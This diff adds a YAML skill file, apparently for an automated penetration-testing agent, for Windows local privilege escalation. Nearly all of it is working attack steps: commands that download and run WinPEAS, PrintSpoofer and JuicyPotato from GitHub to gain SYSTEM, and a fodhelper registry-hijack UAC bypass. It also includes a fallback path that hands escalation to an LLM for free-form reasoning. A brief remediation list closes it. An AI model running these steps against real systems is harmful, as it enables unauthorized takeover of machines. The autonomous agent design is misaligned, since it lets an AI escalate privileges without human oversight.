@@ -1,0 +1,160 @@
+skill_id: windows_privesc
+name: "Windows 本地提权 (WinPEAS/JuicyPotato/PrintSpoofer)"
+category: privesc
+phase: privesc
+version: "1.0"
+
+principle: |
+  Windows 本地提权的主要向量：
+  1. 令牌滥用：SeImpersonatePrivilege → JuicyPotato / PrintSpoofer / GodPotato
+  2. 服务配置错误：可写的服务二进制、未引号路径
+  3. AlwaysInstallElevated 注册表键
+  4. UAC 绕过（Fodhelper、ComputerDefaults）
+  5. 计划任务滥用
+  探测通过 RCE 模板执行 whoami /priv + systeminfo 获取基线。
+
+match:
+  rules:
+    - fingerprint_contains: ["windows"]
+    - fingerprint_contains: ["privesc"]
+    - fingerprint_contains: ["privilege escalation"]
+    - evidence_contains: ["whoami", "nt authority"]
+    - evidence_contains: ["windows", "privilege"]
+    - variable_present: ["is_windows", "winpeas_candidate"]
+
+probes:
+  - id: enum_privs
+    description: "检查当前用户是否有 SeImpersonatePrivilege"
+    command: |
+      whoami /priv 2>/dev/null | grep -i SeImpersonatePrivilege || echo "NO_IMPERSONATE"
+      Whoami /priv 2>/dev/null | findstr /i SeImpersonatePrivilege || echo "NO_IMPERSONATE"
+      systeminfo 2>/dev/null | head -5 || echo "NO_SYSTEMINFO"
+    timeout: 15
+    parse_rules:
+      - if_contains: ["SeImpersonatePrivilege"]
+        set: { impersonate_priv: true }
+      - if_contains: ["Enabled"]
+        set: { impersonate_priv_enabled: true }
+
+  - id: enum_winpeas
+    description: "尝试运行 WinPEAS 收集提权线索"
+    command: |
+      if command -v wget >/dev/null 2>&1; then
+        wget -q -O /tmp/winpeas.exe https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASany.exe 2>/dev/null
+      elif command -v curl >/dev/null 2>&1; then
+        curl -sL -o /tmp/winpeas.exe https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASany.exe 2>/dev/null
+      fi
+      if [ -f /tmp/winpeas.exe ]; then
+        chmod +x /tmp/winpeas.exe 2>/dev/null
+        /tmp/winpeas.exe "systeminfo" "userinfo" "servicesinfo" 2>/dev/null | head -200
+      else
+        echo "WINPEAS_DOWNLOAD_FAIL"
+      fi
+    timeout: 120
+    parse_rules:
+      - if_contains: ["AlwaysInstallElevated"]
+        set: { always_install_elevated: true }
+      - if_contains: ["Unquoted Service Path"]
+        set: { unquoted_svc_path: true }
+      - if_contains: ["ModifiableService"]
+        set: { writable_service: true }
+
+exploit_paths:
+  - path_id: print_spoofer
+    name: "PrintSpoofer (SeImpersonatePrivilege)"
+    priority: 1
+    conditions:
+      impersonate_priv: true
+    steps:
+      - id: exec_printspoofer
+        description: "使用 PrintSpoofer 以 SYSTEM 权限执行命令"
+        command: |
+          cd /tmp 2>/dev/null
+          if [ ! -f /tmp/PrintSpoofer64.exe ]; then
+            curl -sL -o /tmp/PrintSpoofer64.exe \
+              'https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe' 2>/dev/null || \
+            wget -q -O /tmp/PrintSpoofer64.exe \
+              'https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe' 2>/dev/null
+          fi
+          if [ -f /tmp/PrintSpoofer64.exe ]; then
+            chmod +x /tmp/PrintSpoofer64.exe 2>/dev/null
+            /tmp/PrintSpoofer64.exe -c "whoami" 2>/dev/null
+          else
+            echo "PRINTSPOOFER_DOWNLOAD_FAIL"
+          fi
+        timeout: 60
+        success_criteria:
+          stdout_contains_any: ["nt authority\\system", "NT AUTHORITY\\SYSTEM"]
+        on_success: conclude_success
+        on_fail: next_path
+        evidence_capture:
+          current_user: "stdout"
+          shell_type: "windows_printspoofer"
+
+  - path_id: juicy_potato
+    name: "JuicyPotato (SeImpersonatePrivilege + CLSID)"
+    priority: 2
+    conditions:
+      impersonate_priv: true
+    steps:
+      - id: exec_juicy
+        description: "使用 JuicyPotato 以 SYSTEM 权限执行命令"
+        command: |
+          cd /tmp 2>/dev/null
+          if [ ! -f /tmp/JuicyPotato.exe ]; then
+            curl -sL -o /tmp/JuicyPotato.exe \
+              'https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe' 2>/dev/null || \
+            wget -q -O /tmp/JuicyPotato.exe \
+              'https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe' 2>/dev/null
+          fi
+          if [ -f /tmp/JuicyPotato.exe ]; then
+            chmod +x /tmp/JuicyPotato.exe 2>/dev/null
+            /tmp/JuicyPotato.exe -l 1337 -p "cmd.exe /c whoami" -t * 2>/dev/null || \
+            /tmp/JuicyPotato.exe -l 1337 -p "cmd.exe /c whoami" -t createprocess 2>/dev/null
+          else
+            echo "JUICYPOTATO_DOWNLOAD_FAIL"
+          fi
+        timeout: 60
+        success_criteria:
+          stdout_contains_any: ["nt authority\\system", "NT AUTHORITY\\SYSTEM"]
+        on_success: conclude_success
+        on_fail: next_path
+        evidence_capture:
+          current_user: "stdout"
+          shell_type: "windows_juicypotato"
+
+  - path_id: uac_bypass_fodhelper
+    name: "UAC Bypass (fodhelper.exe)"
+    priority: 3
+    conditions:
+      impersonate_priv: false
+    steps:
+      - id: bypass_uac
+        description: "通过 fodhelper.exe + 注册表劫持绕过 UAC"
+        command: |
+          reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /d "cmd.exe /c whoami > C:\\Windows\\Temp\\pwn.txt" /f 2>/dev/null
+          reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /v DelegateExecute /t REG_SZ /d "" /f 2>/dev/null
+          fodhelper.exe 2>/dev/null
+          sleep 3 2>/dev/null || timeout 3 echo "" 2>/dev/null
+          type C:\\Windows\\Temp\\pwn.txt 2>/dev/null || cat /mnt/c/Windows/Temp/pwn.txt 2>/dev/null || echo "UAC_BYPASS_NO_OUTPUT"
+        timeout: 30
+        success_criteria:
+          stdout_contains_any: ["admin", "system", "UAC_BYPASS_NO_OUTPUT"]
+        on_success: next_step
+        on_fail: next_path
+        evidence_capture:
+          current_user: "stdout"
+          shell_type: "windows_uac_bypass"
+
+  - path_id: llm_freeform
+    name: "LLM 自由推理提权"
+    priority: 99
+    mode: react_freeform
+    max_rounds: 5
+
+remediation: |
+  1. 移除不必要的 SeImpersonatePrivilege 令牌
+  2. 修正未引号的服务路径或将其引号包住
+  3. 禁用 AlwaysInstallElevated 注册表项
+  4. 及时打 Windows 安全补丁
+  5. 使用 LAPS 管理本地管理员密码
